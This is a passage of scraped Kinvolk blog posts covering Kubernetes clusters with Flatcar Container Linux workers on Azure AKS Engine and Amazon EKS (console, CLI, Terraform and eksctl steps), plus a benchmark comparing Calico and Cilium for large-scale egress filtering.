too: CLIENT_ID = \"<client-id>\" CLIENT_SECRET = \"<client-secret>\" Create Kubernetes cluster definition Next step is creating a Kubernetes cluster definition. This is a JSON file that\ndefines and configures the AKS Engine cluster. Create a file named kubernetes-flatcar.json with the following contents: { \"apiVersion\" : \"vlabs\" , \"properties\" : { \"orchestratorProfile\" : { \"orchestratorType\" : \"Kubernetes\" , \"kubernetesConfig\" : { \"networkPlugin\" : \"kubenet\" }\n   }, \"masterProfile\" : { \"count\" : 1 , \"dnsPrefix\" : \"\" , \"vmSize\" : \"Standard_D2_v3\" , \"distro\" : \"ubuntu\" }, \"agentPoolProfiles\" : [\n     { \"name\" : \"agentpool1\" , \"count\" : 3 , \"vmSize\" : \"Standard_D2_v3\" , \"availabilityProfile\" : \"AvailabilitySet\" , \"distro\" : \"flatcar\" }\n   ], \"linuxProfile\" : { \"adminUsername\" : \"core\" , \"ssh\" : { \"publicKeys\" : [\n         { \"keyData\" : \"\" }\n       ]\n     }\n   }, \"servicePrincipalProfile\" : { \"clientId\" : \"\" , \"secret\" : \"\" }\n }\n} Note that this cluster definition uses Flatcar Container Linux for worker nodes\nbut Ubuntu for the master node. Currently, Flatcar Container Linux is only supported on worker nodes. There are\nsome cloud-init directives used in control plane provisioning that are not\nsupported by coreos-cloudinit ,\nFlatcar’s minimal cloud-init implementation. This Azure/aks-engine\nissue tracks Flatcar support\nfor the control plane. Deploy AKS Engine cluster Deploy the AKS Engine cluster using the aks-engine CLI tool: aks-engine-v0.57.0-linux-amd64/aks-engine deploy --api-model kubernetes-flatcar.json \\ --dns-prefix \" $TF_VAR_cluster_name \" \\ --resource-group \" $TF_VAR_cluster_name \" \\ --location \" $TF_VAR_resource_group_location \" \\ --client-id \" $CLIENT_ID \" \\ --client-secret \" $CLIENT_SECRET \" \\ --set servicePrincipalProfile.clientId = \" $CLIENT_ID \" \\ --set servicePrincipalProfile.secret = \" $CLIENT_SECRET \" After approximately 10 minutes the cluster should be deployed. To access the cluster, you can find its kubeconfig in ./_output/<cluster-name>/kubeconfig/kubeconfig.<location>.json Let’s use the kubeconfig to check that the cluster is accessible and that\nworker nodes are running Flatcar Container Linux: export KUBECONFIG = \" $PWD /_output/ $TF_VAR_cluster_name /kubeconfig/kubeconfig. $TF_VAR_resource_group_location .json\" kubectl get nodes -o wide The output should show all nodes as Ready: NAME                        STATUS   ROLES    AGE    VERSION   INTERNAL-IP    EXTERNAL-IP   OS-IMAGE                                             KERNEL-VERSION      CONTAINER-RUNTIME\nk8s-agentpool1-37781349-0   Ready    agent    3m9s   v1.18.9   10.240.0.4     <none>        Flatcar Container Linux by Kinvolk 2605.8.0 (Oklo)   5.4.77-flatcar      docker://19.3.12\nk8s-agentpool1-37781349-1   Ready    agent    3m9s   v1.18.9   10.240.0.6     <none>        Flatcar Container Linux by Kinvolk 2605.8.0 (Oklo)   5.4.77-flatcar      docker://19.3.12\nk8s-agentpool1-37781349-2   Ready    agent    3m9s   v1.18.9   10.240.0.5     <none>        Flatcar Container Linux by Kinvolk 2605.8.0 (Oklo)   5.4.77-flatcar      docker://19.3.12\nk8s-master-37781349-0       Ready    master   3m9s   v1.18.9   10.240.255.5   <none>        Ubuntu 16.04.7 LTS                                   4.15.0-1100-azure   docker://19.3.12 From this point on you can start using your Kubernetes AKS Engine cluster\nrunning on Flatcar Container Linux! Cleanup To clean up the cluster and all its associated resources, run: terraform destroy Conclusion In this blog post we showed how to deploy a Kubernetes cluster with AKS Engine\non Flatcar Container Linux. In a future post, we will show how to deploy\nclusters using the new Cluster API support for Azure (CAPZ), just as soon as\nFlatcar support is integrated there: watch this space. Thank you to all our friends at Microsoft, for their help in enabling Flatcar\nContainer Linux in Azure and AKS Engine. If you encounter problems, please let us know by filing an\nissue . See our contact\npage for inquiries about support.", "date": "2020-12-16"},
{"website": "Kinvolk", "title": "Deploying an EKS cluster with Flatcar workers", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Marga Manterola\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2021/02/deploying-an-eks-cluster-with-flatcar-workers/", "abstract": "Amazon Elastic Kubernetes Service (EKS) is a fully automated Kubernetes cluster service on Amazon Web Services (AWS). Flatcar Container Linux is a self-updating operating system designed for containers, making it ideal for running Kubernetes and other container platforms. It is suitable for anyone deploying containerized applications, particularly those seeking to do so securely or at scale. Because it’s container optimized, Flatcar Container Linux is already being used as the OS of choice for EKS workers by companies around the world. Until recently, joining a Flatcar instance to the EKS cluster required some complex manual configuration. With our latest 2605.12.0 Stable release available in the AWS Marketplace , you can deploy Flatcar Container Linux Pro on your EKS workers and have them join your cluster with minimal configuration. There are a lot of different ways of adding workers to your EKS cluster. In this post, we’ll show you how you can do it using Launch templates through the web console and the AWS CLI, and also how to create your cluster with Terraform and eksctl. But no matter how you decide to do it, there are a few things that are the same across all of them. We’ll start with those. Subscribing to the Flatcar Container Linux Pro offer Regardless of how you choose to deploy your workers, you’ll need to subscribe to the Flatcar Container Linux Pro offer in the AWS Marketplace . This needs to be done only once per organization. After that, you’ll be able to deploy as many instances as you want with whatever method you prefer. Subscribing to the offer enables your organization to deploy the Flatcar Container Linux Pro images distributed through the AWS Marketplace. You’ll only be charged for the hours of actual use, so until you deploy the images this won’t mean any extra costs. Worker IAM Role When launching EKS workers, we need to assign an IAM Role to them, which gives them access to the AWS resources they need. For our Flatcar Container Linux Pro workers we’ll need to create a role that includes the following policies: AmazonEKSWorkerNodePolicy AmazonEKS_CNI_Policy AmazonEC2ContainerRegistryReadOnly AmazonS3ReadOnlyAccess See AWS’s IAM documentation on how to create an IAM role for a step by step guide on how to do this. User data In order for your Flatcar workers to join the cluster, you’ll need to set a short script like this one as the user-data: #!/bin/bash mkdir -p /etc/docker\n/etc/eks/bootstrap.sh <cluster-name> Where should you set that script? Well, that depends on how you’re spinning up your workers. In the rest of this post, we’ll look at the following methods: Creating Launch Templates in the Web console Creating Launch Templates with the AWS CLI Using Terraform to provision the whole cluster Using eksctl to provision the whole cluster Using Launch Templates Using EC2 Launch Templates to manage your EKS Node Groups allows you to specify the configuration for the nodes that you’ll be adding to your cluster, including which AMIs they should run and any additional configuration that you want to set. For this example, we’ll assume there’s already an active EKS cluster, to which we’ll add worker nodes running Flatcar Container Linux Pro. There are a bunch of different ways to spin up the cluster, which we won’t cover here. Check out Amazon’s documentation on how to get your EKS cluster ready. When creating the cluster, note that to interact with Kubernetes later on, the user that created the cluster needs to be the same that calls kubectl , at least the first time, so make sure you do this with a user that has CLI credentials. Creating the Launch Template We’ll create an EC2 Launch Template that will include all the customization options that we want to set for our Flatcar nodes.  We’ll start by giving the template a name and description, and then selecting the AMI and instance type that we want. To find the latest Flacar Pro AMI, we simply typed “Flatcar Pro” in the search box and selected the latest version available from the AWS Marketplace. We’ve chosen t3.medium as the instance type for this example. You can select the instance type that suits your needs best. Next, we’ll need to set the right security group. To do that, we’ll use the group that was automatically created when creating the eks cluster, which follows the pattern eks-cluster-sg-<cluster-name> . And finally, we’ll expand the advanced details section and input the necessary userdata. You can copy and paste this snippet, replacing with the name of the cluster to which your workers should be added: #!/bin/bash mkdir -p /etc/docker\n/etc/eks/bootstrap.sh <cluster-name> Optionally, you may also want to select an SSH key. This would allow you to connect to your workers through SSH if you want to debug your setup, but it’s not necessary for running Kubernetes workloads. Adding the Node Group Once we’ve created our Launch Template, we’re ready to add a managed Node Group to our EKS cluster using this template. We’ll find our cluster in the EKS cluster list , go to the Configuration tab, and in the Compute tab click the “Add Node Group” button. This will prompt us to configure the Node Group that we want to add. We’ll select the worker role that we had created for these nodes as well as the launch template that we’ve setup. For the rest of the settings, we can leave the default values, or change them as we see fit. We can now launch our Flatcar nodes! They’ll take a minute or two to be ready. You can check in the Overview window of your cluster. Once the nodes are ready, we can check out the Kubernetes workloads running. Using the AWS CLI As an alternative to the web console, we can follow similar steps through the AWS command line tool . Remember that to use this tool you need to have access to the AWS credentials of the account you want to use, either through the config file or through environment variables. Using this tool means that we need to find out some values that the web console looked up for us when filling in the templates. It’s possible to obtain these values in several ways, we’ll show just one possibility here. We’ll start by fetching the identifier of the latest Flatcar Pro AMI available in the marketplace. We can use a command like this one: $ aws ec2 describe-images \\\n    --owners aws-marketplace \\\n    --region us-east-1 \\\n    --filters \"Name=name,Values=Flatcar-pro-stable*\" \\\n    --query 'sort_by(Images, &CreationDate)[-1].[ImageId,Name,CreationDate]' Next, we’ll find out the security group that needs to be assigned to our nodes, which was created when creating the EKS cluster. We can look it up with a command like this one: $ aws ec2 describe-security-groups \\\n    --region us-east-1 \\\n    --filter \"Name=group-name,Values=eks-cluster-sg-*\" \\\n    --query 'SecurityGroups[*].[GroupName,GroupId]' Finally, we’ll need to encode our user-data script with the base64 command. Like this: base64 -w 0 <<EOF; echo #!/bin/bash mkdir -p /etc/docker /etc/eks/bootstrap.sh flatcar-cluster EOF We now have all the values we need for the launch template. We’ll create a file called launch-template-flatcar.json , with these contents: {\n  \"LaunchTemplateData\": {\n    \"ImageId\": \"ami-0e06fb77ead4c2691\",\n    \"InstanceType\": \"t3.medium\",\n    \"UserData\": \"IyEvYmluL2Jhc2gKbWtkaXIgLXAgL2V0Yy9kb2NrZXIKL2V0Yy9la3MvYm9vdHN0cmFwLnNoIGZsYXRjYXItY2x1c3Rlcgo=\",\n    \"SecurityGroupIds\": [\n        \"sg-08cf06b2511b7c0a5\"\n    ]\n   }\n} And then create the template in EC2 with: $ aws ec2 create-launch-template \\\n    --launch-template-name flatcar-eks-workers \\\n    --version-description \"EKS workers for flatcar-cluster\" \\\n    --cli-input-json file://./launch-template-flatcar.json Once the launch template is created, we can start our nodes. To do that, we’ll look up the subnets associated with our EKS cluster, which we can do with a command like this: $ aws ec2 describe-subnets \\\n    --region us-east-1 \\\n    --filter \"Name=tag-key,Values=kubernetes.io/cluster/flatcar-cluster\" \\\n    --query 'Subnets[*].SubnetId' To start the nodes, we’ll need to pass the role that we created at the beginning , assigning the mentioned permissions. We have to use the ARN format for the role (e.g. arn:aws:iam::012345678901:role/eks-worker-role ). With that, we have all the information to start our nodes, like this: $ aws eks create-nodegroup \\\n    --cluster-name flatcar-cluster \\\n    --nodegroup-name flatcar-workers \\\n    --region us-east-1 \\\n    --subnets subnet-4b4ded36 subnet-138de578 subnet-5a6ce217 \\\n    --node-role 'arn:aws:iam::012345678901:role/eks-worker-role' \\\n    --launch-template name=flatcar-eks-workers This will create the instances and add them to our cluster. After a couple of minutes, we’ll be able to interact with the cluster using kubectl. To do that, we’ll need to generate a kubeconfig that connects to the cluster. There are a few different ways to do this. For example, we can call: $ aws eks update-kubeconfig \\\n    --region us-east-1 \\\n    --name flatcar-cluster \\\n    --kubeconfig ./kubeconfig_flatcar-cluster This will create a kubeconfig file that we can pass to kubectl for connecting to the cluster. Like this: $ kubectl --kubeconfig kubeconfig_flatcar-cluster get pods -A\nNAMESPACE     NAME                       READY   STATUS    RESTARTS   AGE\nkube-system   aws-node-56mfs             1/1     Running   0          30s\nkube-system   aws-node-7zng9             1/1     Running   0          30s\nkube-system   coredns-59b69b4849-4s9gq   1/1     Running   0          29m\nkube-system   coredns-59b69b4849-p7bml   1/1     Running   0          29m\nkube-system   kube-proxy-7d8ld           1/1     Running   0          30s\nkube-system   kube-proxy-lhz9h           1/1     Running   0          30s Using Terraform If you use Terraform to manage your AWS infrastructure, you can also create your Flatcar EKS workers with it. Our repository of terraform examples includes fully working examples of how to do just that. No matter how you’re configuring your infrastructure, you’ll need to find out the AMI for the latest version of Flatcar Pro.  You can do this with a snippet like this one: data \"aws_ami\" \"flatcar_pro_latest\" {\n  most_recent = true\n  owners      = [\"aws-marketplace\"]\n\n  filter {\n    name   = \"architecture\"\n    values = [\"x86_64\"]\n  }\n\n  filter {\n    name   = \"virtualization-type\"\n    values = [\"hvm\"]\n  }\n\n  filter {\n    name   = \"name\"\n    values = [\"Flatcar-pro-stable-*\"]\n  }\n} The official terraform-aws-modules/eks/aws module takes care of most of the work related to EKS clusters. Using this module, it’s really easy to use Flatcar for the EKS workers. We simply need to select the AMI, pass the additional policy to the worker role and the additional pre_userdata . For example, we could do that with a snippet like this one: module \"eks\" {\n  source          = \"terraform-aws-modules/eks/aws\"\n  cluster_name    = var.cluster_name\n  cluster_version = \"1.18\"\n  subnets         = module.vpc.private_subnets\n  vpc_id          = module.vpc.vpc_id\n\n  workers_additional_policies = [\n    \"arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess\"\n  ]\n\n  worker_groups = [\n    {\n      ami_id               = data.aws_ami.flatcar_pro_latest.image_id\n      pre_userdata         = \"mkdir -p /etc/docker\"\n      instance_type        = \"t3.medium\"\n      root_volume_type     = \"gp2\"\n      asg_desired_capacity = 2\n    },\n  ]\n} On top of the cluster, we’ll need to configure at least the VPC, the kubernetes module, and the AWS region. There’s a lot that we can customize, of course, but this is one possible configuration: variable \"cluster_name\" {\n  type        = string\n  default     = \"flatcar-cluster\"\n}\n\nprovider \"aws\" {\n  region  = \"us-east-1\"\n}\n\ndata \"aws_availability_zones\" \"available\" {}\n\nmodule \"vpc\" {\n  source  = \"terraform-aws-modules/vpc/aws\"\n\n  name                 = \"${var.cluster_name}-vpc\"\n  cidr                 = \"10.0.0.0/16\"\n  azs                  = data.aws_availability_zones.available.names\n  private_subnets      = [\"10.0.1.0/24\", \"10.0.2.0/24\", \"10.0.3.0/24\"]\n  public_subnets       = [\"10.0.4.0/24\", \"10.0.5.0/24\", \"10.0.6.0/24\"]\n  enable_nat_gateway   = true\n  single_nat_gateway   = true\n  enable_dns_hostnames = true\n\n  tags = {\n    \"kubernetes.io/cluster/${var.cluster_name}\" = \"shared\"\n  }\n\n  public_subnet_tags = {\n    \"kubernetes.io/cluster/${var.cluster_name}\" = \"shared\"\n    \"kubernetes.io/role/elb\"                    = \"1\"\n  }\n\n  private_subnet_tags = {\n    \"kubernetes.io/cluster/${var.cluster_name}\" = \"shared\"\n    \"kubernetes.io/role/internal-elb\"           = \"1\"\n  }\n}\n\ndata \"aws_eks_cluster\" \"cluster\" {\n  name = module.eks.cluster_id\n}\n\ndata \"aws_eks_cluster_auth\" \"cluster\" {\n  name = module.eks.cluster_id\n}\n\nprovider \"kubernetes\" {\n  host                   = data.aws_eks_cluster.cluster.endpoint\n  token                  = data.aws_eks_cluster_auth.cluster.token\n  cluster_ca_certificate = base64decode(data.aws_eks_cluster.cluster.certificate_authority.0.data)\n} Please note that to use these rules you’ll need to have AWS credentials configured in your environment , for a user that has at least these permissions . Running terraform init && terraform apply with the above rules creates the cluster with the Flatcar nodes attached. It also creates a kubeconfig_cluster-name file that we can use to interact with Kubernetes. $ kubectl --kubeconfig kubeconfig_flatcar-cluster get pods -A\nNAMESPACE     NAME                      READY   STATUS    RESTARTS   AGE\nkube-system   aws-node-6jqch            1/1     Running   0          92s\nkube-system   aws-node-fzkrb            1/1     Running   0          92s\nkube-system   coredns-c79dcb98c-8g5xs   1/1     Running   0          13m\nkube-system   coredns-c79dcb98c-rdrmb   1/1     Running   0          13m\nkube-system   kube-proxy-szqkp          1/1     Running   0          92s\nkube-system   kube-proxy-xfzpm          1/1     Running   0          92s Check out the rest of our examples if you want to see more ways of using Flatcar in your workers. Using eksctl eksctl is the official CLI for EKS. It greatly simplifies managing our EKS clusters from the command line. To use it, you’ll need to have credentials for a user that has at least these permissions . To create a cluster with Flatcar workers, we’ll use a cluster configuration file. In the file, we’ll need to select an AWS region and the corresponding AMI of Flatcar Pro, that we need to look up, like we did for the AWS CLI. For example, for the us-east-2 region: $ aws ec2 describe-images \\\n    --owners aws-marketplace \\\n    --region us-east-2 \\\n    --filters \"Name=name,Values=Flatcar-pro-stable*\" \\\n    --query 'sort_by(Images, &CreationDate)[-1].[ImageId,Name,CreationDate]' With this value, we can create our eksctl-flatcar.yaml file: apiVersion: eksctl.io/v1alpha5\nkind: ClusterConfig\n\nmetadata:\n  name: flatcar-cluster\n  region: us-east-2\n\nmanagedNodeGroups:\n  - name: flatcar-workers\n    ami: ami-02eb5584cab19ebbd\n    instanceType: t3.medium\n    minSize: 1\n    maxSize: 3\n    desiredCapacity: 2\n    volumeSize: 20\n    labels: {role: worker}\n    tags:\n        nodegroup-role: worker\n    iam:\n        attachPolicyARNs:\n          - arn:aws:iam::aws:policy/AmazonEKSWorkerNodePolicy\n          - arn:aws:iam::aws:policy/AmazonEKS_CNI_Policy\n          - arn:aws:iam::aws:policy/AmazonEC2ContainerRegistryReadOnly\n          - arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess\n    overrideBootstrapCommand: |\n        #!/bin/bash\n        mkdir -p /etc/docker;\n        /etc/eks/bootstrap.sh flatcar-cluster With this file, we can call eksctl to create our cluster. It will take care of creating the cluster, the VPN, the launch templates, the security groups and so on. eksctl create cluster -f eksctl-flatcar.yaml This will take a while to complete. Once it’s done, it will create a kubelet.cfg file that we can use to connect to the cluster: $ kubectl --kubeconfig=kubelet.cfg get nodes\nNAME                                           STATUS   ROLES    AGE    VERSION\nip-192-168-1-112.us-east-2.compute.internal    Ready    <none>   4m3s   v1.18.9-eks-d1db3c\nip-192-168-38-217.us-east-2.compute.internal   Ready    <none>   4m3s   v1.18.9-eks-d1db3c\n\n$ kubectl --kubeconfig=kubelet.cfg get pods -A\nNAMESPACE     NAME                       READY   STATUS    RESTARTS   AGE\nkube-system   aws-node-rbztz             1/1     Running   0          27m\nkube-system   aws-node-vc8qw             1/1     Running   0          27m\nkube-system   coredns-66bc8b7b7b-gvn2g   1/1     Running   0          32m\nkube-system   coredns-66bc8b7b7b-n889w   1/1     Running   0          32m\nkube-system   kube-proxy-8w75g           1/1     Running   0          27m\nkube-system   kube-proxy-9vrzp           1/1     Running   0          27m We would like to have better integration with eksctl , which would allow us to simply specify the OS family instead of having to set the configuration file. We are working with the community to enable that option as well (see this github issue and vote on it if you’d like to see that added!). You’re ready to use your cluster! We’ve covered a few ways in which we can add Flatcar workers to our EKS clusters. No matter how you decide to do this, your nodes are now ready to start running your Kubernetes workloads! We’d love to hear how this experience goes for you.", "date": "2021-02-09"},
{"website": "Kinvolk", "title": "Egress Filtering Benchmark Part 2: Calico and Cilium", "author": ["\n  By\n  \n  \n  \n  \n    \n    \n      Imran Pochi\n    \n    \n    /\n    \n    \n  \n    \n    \n      Alban Crequy\n    \n    \n    \n  \n  \n    ", "\n  \n"], "link": "https://kinvolk.io/blog/2020/12/egress-filtering-benchmark-part-2-calico-and-cilium/", "abstract": "In a recent blog\npost , we\ncompared three different technical approaches to filtering egress traffic on Linux: IP tables, IP sets, and\nBPF. While that provided some interesting baseline benchmarks of the core Linux technologies, we wanted to go\nbeyond that to look at how one would implement such filters in practice, using off-the-shelf cloud native\nnetwork policy solutions. In the realm of the Cloud Native, it is not far-fetched to imagine a Kubernetes cluster needing egress\nfiltering for controlling the traffic (host or pod) attempting to leave the network to possibly wild and\ndangerous endpoints on the internet. Indeed, this is a common use case for avoiding exfiltration of data by\nmalicious workloads. One could of course build a custom egress filtering framework to suit the use case based on the existing\ntechnologies in the Linux networking pipeline. Or one could take advantage of the Kubernetes CNI plugins that\nalready offer similar functionality. Our friends at SAP asked us to perform a benchmark of the two most widely used Kubernetes CNIs, Calico and\nCilium, for this task. This blog post presents the methodology and results from benchmarking Calico and Cilium\ndeployed on a Lokomotive cluster. Before getting into the details, we would like to make clear that the results of this benchmark are highly\nspecific to a single use case of egress filtering of large numbers (up to millions) of records, and do not\nreflect the general performance of either Cilium or Calico for Kubernetes networking and policy enforcement.\nFurther, we make use of Cilium capabilities that are still in beta (as described in more detail below). Goals We had the following goals going into this study: Provide a reproducible benchmark framework that anyone can download and use. Compare the scalability and potential performance overhead by Kubernetes CNI plugins such as Calico and\nCilium against using the underlying Linux filtering mechanisms (IP sets and eBPF, respectively). About Calico Calico is the most popular open source CNI plugin for Kubernetes, according\nto the recent Datadog container survey . Calico not only\nprovides networking but also offers policy isolation for securing the Kubernetes cluster using advanced\ningress and egress policies. Calico provides a choice of dataplane including a standard Linux networking dataplane (default), a pure Linux\neBPF dataplane and a Windows HNS dataplane. About Cilium Cilium , an increasingly popular open source Kubernetes CNI plugin, leverages eBPF to\naddress the networking challenges of container workloads such as scalability, security and visibility. Cilium\ncapabilities include identity-aware security, multi-cluster routing, transparent encryption, API-aware\nvisibility/filtering, and service-mesh acceleration. Cilium only recently added support for both deny and host policies, and they are still considered beta\nfeatures (expected to be generally available in Cilium 1.10). As such, they are not performance tuned, and\nin fact the Cilium team suggests that to get good performance, the preferred long-term solution would be to\nuse prefilter , as they already do for ingress\nfiltering. Unfortunately, egress filtering using prefilter is not currently supported (see issue #14374 ). Network Policies Kubernetes network policies are defined using the Kubernetes NetworkPolicy resource. However, Kubernetes\nitself does not enforce network policies, and instead delegates their enforcement to the network plugins, in\nour case Calico or Cilium. Kubernetes NetworkPolicy resource is an application-centric construct i.e. it allows you to specify how a pod\nis allowed to communicate with others Pods, Services, external Ingress or Egress traffic. However, it cannot\nbe used to enforce rules on a node or cluster level. Hence for egress filtering, we create network policies\nusing these CNI plugins’ custom APIs. Calico provides its NetworkPolicy, GlobalNetworkPolicy and GlobalNetworkSet API objects which provide\nadditional features such as order, namespace scoped or cluster-wide enforcement of policies. For Calico, we used GlobalNetworkSet API passing a  list of CIDRs that we want to deny egress to and then\nreference the GlobalNetworkSet resource in the GlobalNetworkPolicy via label selectors. Under the hood, this setup is similar to using IP sets for filtering egress traffic. Calico uses\nGlobalNetworkSet to create IP sets and GlobalNetworkPolicy to update the iptables matching the IP set. Cilium, on the other hand, uses eBPF as the underlying technology to enforce network policies. A Cilium agent\nrunning on each host translates the network policy definitions to eBPF programs and eBPF maps and attaches\nthem to different eBPF hooks in the system. Network policy definitions are created with the help of\nCiliumNetworkPolicy and CiliumClusterwideNetworkPolicy custom resources for namespace scoped and cluster-wide\nnetwork traffic respectively. For Cilium, we used CiliumClusterwideNetworkPolicy API passing a list of CIDRs to deny egress and match the\npolicy using label selectors for both application workloads and network traffic on the host. Metrics Filtering network traffic could be a costly operation, especially if the number of rules to check is\nconsiderably high — such as in millions (as is the case with a real-world scenario we are working on).\nThroughput, CPU usage and latency must all be measured to provide a meaningful conclusion for the technologies\nto be used. We have used the following metrics to measure the performance of the filters: Throughput CPU usage Latency For a Kubernetes CNI an equally important metric is Set-up time . Since Calico/Cilium delegates the\nresponsibilities to the underlying technologies, we want to capture the time taken by the CNI plugin to\nprocess the created API objects and enforce the network policies for egress filtering. Scenario The scenario for this test is, as in our previous egress filtering benchmark, composed of a client and a server computer that communicate through an IP network.\nThe egress filtering is performed on the client machine and there is no filtering performed on the server\nside. We test five possible mechanisms for doing the filtering: iptables, “raw” IP sets and tc-eBPF test application, as in the previous benchmark (retesting to ensure\nconsistency) Calico and Cilium, in both cases running the client application in a pod in a Lokomotive Kubernetes cluster,\nwith the solution under test running as the Kubernetes CNI plug-in. In addition, for a baseline reference, we also ran the test without any filtering mechanism in place. This is shown in the following diagram: Benchmark Set-up As mentioned earlier, our set-up builds on the work of the existing framework.  Hence the software and\nhardware profiles used to benchmark IP sets and tc-eBPF largely remain the same, except for the following\nchanges: Updated software versions for Flatcar, ipset, iperf and the Linux kernel. Two Lokomotive clusters with one worker node to run the benchmarks, one each for Calico and Cilium. Hardware To perform the test we used the following bare metal servers running on Equinix\nMetal : 2 machines as client and server machines for IP set and tc-eBPF filters. 2 machines for the Lokomotive cluster (1 controller, 1 worker) for benchmarking Calico. 2 machines for the Lokomotive cluster (1 controller, 1 worker) for benchmarking Cilium. The specifications of all the machines used were: c2.medium.x86\n1x AMD EPYC 7401P 24-Core Processor @ 2.0GHz\n2x 120GB SSD\n2x 480GB SSD\n64GB RAM\n2x 10Gbps Software Kubernetes is deployed using Lokomotive . We used two separate\nclusters for this benchmark, to isolate comparison of Calico and Cilium from interfering with each other. Calico Calico offers a choice of dataplane options, including standard Linux networking (its default) and eBPF.\nHowever, Calico’s eBPF dataplane doesn’t support host endpoints, which means that node-level egress filtering\nis not possible with it. Hence, we use the default standard Linux networking dataplane for our tests. Cilium Cilium with its eBPF based dataplane is installed on Lokomotive using a modified default\nconfiguration to support our test scenario. The changes are as follows: Increase the number of entries in the endpoint policy map to the maximum limit allowed; i.e. 65536. Enable host firewall for enforcing host network policies. The network interface name on which the host firewall applies. Software Versions The exact versions of all the tools we used are: Flatcar Container Linux by Kinvolk Alpha (2705.0.0) Linux kernel 5.9.11 iperf 3.6 (in a Docker container with the host network) iptables v1.6.2 ipset v7.6, protocol version: 7 Lokomotive v0.5.0 for Calico; Cilium feature branch for installing Lokomotive with Cilium Kubernetes v1.19.4 Calico v3.16.4 Cilium v1.9.0 A minimal working configuration for deploying Lokomotive on Equinix Metal can be found here and the\ninstructions are mentioned in the README.md . Tests We used the following parameters for each of the tests: Throughput: The goal of this test is to maximize throughput, ignoring CPU consumption (i.e. CPU will\ntypically be saturated). Therefore, iperf3 was used with the bandwidth set to 10Gbps (equal to the network\ninterface adapter speed) and UDP Packet size set to 1470. Throughput is tested in Gbps; we have not measured\nthroughput in packet per second (pps) but that could be added in the benchmark framework\n(see issue #16 ). CPU usage: In this test we want to see the variation in CPU usage for a given throughout. Therefore, we\nagain use iperf3 but reduce the bandwidth to 1G. UDP Packet size remains at 1470. Latency: To test latency, we bombard the server with ICMP packets using the ping utility at a rate of 1000\npings per millisecond. Setup Time: As we discussed in our first egress filtering benchmark, set-up time is an implementation-detail\nspecific to the benchmarking application and most certainly can be improved upon. Setup time for Calico and\nCilium is calculated using ‘ping’ (ICMP) on a polling basis, checking the enforcement of policies on each\npoll. Reproducibility All the tools and instructions to reproduce these tests are provided in the GitHub repository github.com/kinvolk/egress-filtering-benchmark Constraints To avoid the error etcdserver: Request entity too large multiple NetworkPolicy manifests (for Cilium and\nCalico) are created with each containing a maximum of 50000 CIDR entries. When the number of rules increases,\nmore manifests are created and sent to the Kubernetes API server. One possible source of error in testing is if the Kubernetes API server and etcd themselves become a\nbottleneck for requests, especially when a lot of resources are created in a short span of time. since both\nCalico and Cilium use them extensively. Therefore, Controller nodes were chosen such that they can handle the\nload generated with a very high number of rules and, during our testing, we closely monitored CPU utilization\nto ensure there was no such bottleneck.. Results Before we get into the detail, we should note that Cilium failed\n(#14377) our tests when the number of rules increased to\n100,000 and beyond, hence the disappearance of the orange bar from the results at the further end of the\nhorizontal axis. Test #1 - Throughput The results of the throughput test are shown in the following chart: As can be seen, the overhead of Calico on top of IP sets is not much. Calico managed to keep its throughput\nbetween 2.5 and 2.7 Gbps despite the increasing number of rules. In correlation with the increased CPU usage\n(test #2) and latency (test #3), it is not a surprise that Calico manages a slightly lower throughput than the\nbase IP sets scenario. Cilium on the other hand maintained a consistent throughput around 2.3 Gbps which is slightly lower than other\nfilters. Given that this test is for maximum throughput, ignoring CPU usage, we would expect the CPU to be saturated,\nand that is indeed what we see with CPU consumption hovering between 85% and 98%. Test #2 - CPU Usage The results of the CPU usage test are shown in the following chart: CPU usage for ipset and tc-eBPF is very similar, and does not increase with the increase in the number of\nrules. Cilium has the highest CPU usage of all filters, except for iptables, at a consistent 40 percent. Analyzing\nthe stack trace using the BCC’s profile tool,\nwe found that an equal amount of time for Cilium was spent doing iptables rule processing. We suspect this is\ndue to default Cilium installation being kubeProxyReplacement=probe , meaning Cilium works in conjunction\nwith kube-proxy. There is another mode which Cilium supports i.e. kube-proxy\nfree , which we believe would improve the\nperformance as it wouldn’t be spending the time in iptables rules processing( see issue #18 ). Calico reports a marginally higher CPU usage compared to IP sets. We have not profiled the cause of this but\nthere could be different possibilities to explore, one of them being that Lokomotive ships by default with a few pre-configured Calico\nnetwork policies to secure workloads and host endpoints, hence as a result for each packet sent or received by\niperf, the kernel needs to iterate through those rules. Note that, because these are Calico-specific policies,\nthey are not applied in the Cilium test case. Test #3 - Latency As expected from our previous results, raw iptables performs very badly at scale, so we have to show the graph\nwith a logarithmic scale. However, this doesn’t provide a clear difference between other filters, so we also\nshow the results with a linear scale, excluding the iptables results. The second graph removes iptables to properly dissect the information present regarding latency for other\nfilters. Even though Calico and Cilium reported a slightly increased latency compared with other filters, the main\npoint is that the increase in the number of rules did not adversely affect the latency for either of them\n(which is what we would expect from our prior results with IP sets and eBPF). Latency can also be measured with netperf TCP_RR instead of ping. With more time to investigate, this is\nsomething we would like to explore if we rerun these tests in future (see issue #17 ). Test #4 - Set-up Time The set-up time is acceptable for all the filters even though it does increase as the number of rules grows. The increase in rules does not seem to affect Calico greatly and as the number of rules increases, the\ndifference in set-up time for Calico against other filters gets smaller. As there is no synchronous confirmation of when rules have been applied, we check on a polling basis, which\nnecessarily introduces a level of granularity to this test, making the results an approximation of the exact\nset-up time. Specifically, to calculate the set-up time needed by Calico/Cilium, the benchmark application\nintroduces a 1 millisecond sleep before checking again for the readiness of the egress filters. For this\nreason, the graph should not be used as an exact benchmark comparison. Instead, the values on the graph should\nbe thought of as the upper limit, incrementing in milliseconds. Test #5 - IP sets and Calico for Rules More than 1 Million Since we found Calico scaling easily to our maximum test scenario of 1 Million rules, we decided, for fun, to\npush the boundaries to the breaking point and see what happens. By default, when Calico creates the IP set, the maximum limit on the ipset is 1048576 as per the Felix\nconfiguration resource specification . This means that if the number of rules is more than the maximum value, Calico throws an error: Hash is full, cannot add more elements. Calico pod goes into the CrashLoopBackoff state until the GlobalNetworkSets created are deleted with kubectl. To mitigate the issue, the maximum ipset size needs to be configured. Thankfully, we can do that by editing\nthe default FelixConfiguration as follows. calicoctl patch felixconfiguration default --patch = '{\"spec\": {\"maxIpsetSize\": 100000000}}' Re-running the tests resulted in Calico managing to update 10 Million rules, however, the health of felix\nservice fluctuated from Live to Not live . For 50 Million and 100 Million records, it is not entirely clear\nwhether the limitation was the benchmarking framework or Calico (issue #4069 ) – 